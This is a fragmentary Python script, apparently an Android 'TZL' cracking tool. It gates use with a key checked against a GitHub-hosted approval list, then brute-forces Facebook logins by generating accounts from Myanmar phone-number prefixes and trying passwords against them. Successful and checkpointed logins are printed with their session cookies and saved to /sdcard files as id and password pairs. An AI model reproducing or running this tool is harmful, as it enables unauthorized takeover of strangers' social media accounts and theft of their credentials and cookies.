...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/Thawzinlat.5.3.22')
        FD()
        return None
...
try:
    key1=open("/storage/emulated/0/Tzl.txt",'r').read()
except IOError:
    kok=open("/storage/emulated/0/Tzl.txt",'w')
...
a=requests.get(" https://raw.githubusercontent.com/Thawzinlat54/T-7/main/Approval.txt").text
b=str(a)
key1=open("/storage/emulated/0/Tzl.txt",'r').read()
key2=str(key1)  
if key2 in b:
...
logo =                                          ("""   
\033[1;36m         88888888888 8888888888P 888
\033[1;36m             888           d88P  888
\033[1;36m             888          d88P   888 
\033[1;36m             888         d88P    888
\033[1;36m             888        d88P     888      
\033[1;36m             888       d88P      888  
\033[1;36m             888      d88P       888      
\033[1;36m             888     d8888888888 88888888 
\033[1;37m================= \33[32;45mTZL\33[0;m =====================
\033[1;37m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mTZl\33[
\033[1;37m     \033[1;32mFACEBOK      : \033[1;32m ThawZinLat
\033[1;37m     \033[1;36mTOOL STATUS  :  \033[1;36mPersonal Use
\033[1;37m     \033[1;97mTOOL VIRSION :  \033[1;97m1.0
\033[1;37m================= \33[32;45mTZL\33[0;m =====================\n""")
loop = 0
oks = []
cps = []
...
def i():
    ...
    jalan("\033[1;32m\t  USE MYANMAR COUNTRY CODE  ")
    jalan('\033[1;32m     \t     MYANMAR CODES\n     \033[1;33m95973, \033[1;33m95994 ,\033[1;33m95923 ,\033[1;33m95965  ...\033[0;97m')
    jalan('\033[1;32m============================================')
    code = input(' PUT CODE : ')
    print("")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(TZL-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/TZL-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(TZL-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/TZL-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[TZL] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
